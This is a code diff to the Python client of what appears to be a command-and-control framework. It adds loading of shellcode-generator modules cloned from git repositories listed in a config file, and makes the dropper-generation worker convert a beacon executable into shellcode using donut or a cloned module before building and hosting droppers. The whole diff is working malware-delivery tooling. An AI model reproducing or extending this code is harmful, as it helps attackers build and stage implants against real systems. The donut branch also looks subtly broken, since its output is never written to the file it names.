@@ -74,11 +74,61 @@ for moduleName in os.listdir(dropperModulesDir):
             except ImportError as e:
                 print(f"Failed to import {moduleName}: {e}")
 
+#
+# ShellCode modules
+#
 
-#
-# Terminal modules
-#
-# legacy path setup removed in favor of package imports
+import donut
+
+try:
+    import pkg_resources
+    shellCodeModulesDir = pkg_resources.resource_filename(
+        'C2Client',  
+        'ShellCodeModules' 
+    )
+    ShellCodeModulesPath = pkg_resources.resource_filename(
+        'C2Client',  
+        'ShellCodeModules.conf'  
+    )
+
+except ImportError:
+    shellCodeModulesDir = os.path.join(os.path.dirname(__file__), 'ShellCodeModules')
+    ShellCodeModulesPath = os.path.join(os.path.dirname(__file__), 'ShellCodeModules.conf')
+
+if not os.path.exists(shellCodeModulesDir):
+    os.makedirs(shellCodeModulesDir)
+
+with open(ShellCodeModulesPath, "r") as file:
+    repositories = file.readlines()
+
+ShellCodeModules = []
+for repo in repositories:
+    repo = repo.strip()
+    repoName = repo.split('/')[-1].replace('.git', '')
+    repoPath = os.path.join(shellCodeModulesDir, repoName)
+
+    if not os.path.exists(repoPath):
+        print(f"Cloning {repoName} in {repoPath}.")
+        try:
+            Repo.clone_from(repo, repoPath)
+        except Exception as e:
+                print(f"Failed to clone {repoName}: {e}")
+    else:
+        print(f"Repository {repoName} already exists in {shellCodeModulesDir}.")
+
+for moduleName in os.listdir(shellCodeModulesDir):
+    modulePath = os.path.join(shellCodeModulesDir, moduleName)
+    
+    if os.path.isdir(modulePath):
+        if os.path.exists(modulePath):
+            sys.path.insert(1, modulePath)
+            try:
+                # Dynamically import the module
+                importedModule = __import__(moduleName)
+                ShellCodeModules.append(importedModule)
+                print(f"Successfully imported {moduleName}")
+            except ImportError as e:
+                print(f"Failed to import {moduleName}: {e}")
 
 
 #
@@ -718,9 +768,40 @@ class DropperWorker(QObject):
         cmdToRun = ""
         for module in DropperModules:
             if self.moduleName == module.__name__.lower():
-                logging.debug("GenerateAndHostGeneric Generate for module: %s", self.moduleName)
+                logging.debug("GenerateAndHostGeneric DropperModule: %s", self.moduleName)
+
+                shellcodeGenerator = "Donut"
+
+                # default to Dropper shellcode generator
+                rawshellcode = ""
+
+                # Check shellcode generatro
+                if shellcodeGenerator.lower() == "donut".lower():
+                    print("Donut Shellcode generator")
+                    shellcode = donut.create(
+                        file=beaconFilePath, 
+                        params=beaconArg
+                    )
+                    beaconArg = ""
+                    beaconFilePath = ""
+                    rawshellcode = "loader.bin"
+
+                else:
+                    for ShellCodeModule in ShellCodeModules:
+                        logging.debug("ShellCodeModule: %s", ShellCodeModule)
+
+                        if shellcodeGenerator.lower() == ShellCodeModule.__name__.lower():
+                            logging.debug("GenerateAndHostGeneric ShellCodeModule: %s", ShellCodeModule.__name__)
+
+                            genShellcode = getattr(ShellCodeModule, "buildLoaderShellcode")
+                            genShellcode(beaconFilePath, "", beaconArg, 3)
+
+                            beaconArg = ""
+                            beaconFilePath = ""
+                            rawshellcode = "finalShellcode.bin"
+                    
                 genPayload = getattr(module, DropperModuleGeneratePayloadFunction)
-                droppersPath, shellcodesPath, cmdToRun = genPayload(beaconFilePath, beaconArg, "", urlDownload, self.additionalArgs.split(" "))
+                droppersPath, shellcodesPath, cmdToRun = genPayload(beaconFilePath, beaconArg, rawshellcode, urlDownload, self.additionalArgs.split(" "))
 
         # Upload the file and get the path
         for dropperPath in droppersPath:
@@ -813,7 +894,7 @@ class CommandEditor(QLineEdit):
             self.setText(cmd.strip())
 
     def setCmdHistory(self):
-        cmdHistoryFile = open('.termHistory')
+        cmdHistoryFile = open(HistoryFileName)
         self.cmdHistory = cmdHistoryFile.readlines()
         self.idx=len(self.cmdHistory)-1
         cmdHistoryFile.close()
